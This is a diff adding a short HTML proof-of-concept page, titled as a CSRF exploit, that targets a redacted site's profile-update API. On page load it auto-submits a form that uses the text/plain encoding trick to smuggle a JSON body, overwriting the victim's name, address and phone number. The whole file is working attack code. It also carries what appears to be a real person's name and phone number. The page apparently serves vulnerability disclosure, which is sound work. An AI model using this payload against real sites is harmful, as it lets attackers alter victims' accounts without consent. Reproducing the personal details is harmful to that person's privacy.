@@ -1,0 +1,12 @@
+<html>
+<title>CSRF Exploit POC by Viraj</title>
+
+<body onload="document.createElement('form').submit.call(document.getElementById('myForm'))">
+    <center>
+        <form id=myForm action=https://redact.com/api/rest/model/atg/userprofiling/ProfileActor/updateMyData method=post enctype=text/plain>
+<input type=text name='{"country":"US","first_name":"Viraj","last_name":"Vaishnav","street_address":"MandleColony3","city":"Indore3","state":"MadhyaPradesh3' value='","zip_code":"453331","phone_number":"+919131625314","is_primary":0}'>
+<input type=submit value=send>
+</form>
+</body>
+
+</html>
